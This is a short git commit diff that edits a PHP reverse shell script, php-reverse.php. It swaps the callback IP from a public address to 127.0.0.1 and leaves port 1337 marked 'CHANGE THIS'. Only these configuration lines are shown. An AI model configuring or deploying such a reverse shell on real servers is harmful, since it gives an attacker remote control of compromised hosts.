adca445496ac5d62178cef2518c575388d42fda1
Tacticalprm <ibrahimkaya082@gmail.com>
2020-10-27 21:45:19 +0300

    Update php-reverse.php

--- php-reverse.php
+++ php-reverse.php
@@ -47,7 +47,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '88.243.79.137';  // CHANGE THIS
+$ip = '127.0.0.1';  // CHANGE THIS
 $port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
